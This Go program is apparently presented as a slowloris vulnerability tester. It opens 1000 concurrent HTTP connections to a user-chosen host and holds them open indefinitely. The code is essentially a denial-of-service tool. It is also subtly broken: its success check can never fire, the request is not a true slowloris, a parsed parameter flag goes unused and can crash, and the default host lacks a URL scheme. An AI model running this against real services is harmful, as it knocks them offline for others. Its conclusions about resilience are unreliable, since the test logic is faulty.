package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func dial(host string) bool {
	tr := &http.Transport{
		DisableKeepAlives: false, // ensure persistent connections
	}

	client := &http.Client{
		Transport: tr,
	}

	req, err := http.NewRequest("GET", host, nil)
	if err != nil {
		log.Println("error creating request:", err)

		return false
	}

	// make the request
	resp, err := client.Do(req)
	if err != nil {
		log.Println("error making request:", err)

		return false
	}

	defer resp.Body.Close()

	// read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println("error reading response:", err)

		return false
	}

	// print the response
	fmt.Println("Response Status:", resp.Status)
	fmt.Println("Response Body:", string(body))

	// keep the connection open by sleeping (for demonstration purposes)
	// you may handle this differently in your actual use case
	for {
		time.Sleep(10 * time.Second)
	}
}

func main() {
	log.SetOutput(os.Stdout)

	var (
		hostFlag      = flag.String("host", "localhost", "target host address")
		endpointsFlag = flag.String("endpoints", "/", "target specific endpoints")
		paramsFlag    = flag.String("params", "", "system parameters for testing")
	)

	flag.Parse()

	endpoints := strings.Split(*endpointsFlag, ",")
	paramSet := strings.Split(*paramsFlag, "&")

	params := make(map[string]string)

	for _, item := range paramSet {
		parts := strings.Split(item, "=")
		params[parts[0]] = parts[1]
	}

	log.Println(*hostFlag)
	log.Println(endpoints)
	log.Println(params)

	wg := sync.WaitGroup{}

	for i := 0; i < 1000; i++ {
		wg.Add(1)

		go func() {
			if dial(*hostFlag) {
				log.Println("slowloris attack succeed, service is out of control")

				os.Exit(1)
			}

			wg.Done()
		}()
	}

	wg.Wait()

	log.Println("safe against slowloris attack!")

	os.Exit(0)
}
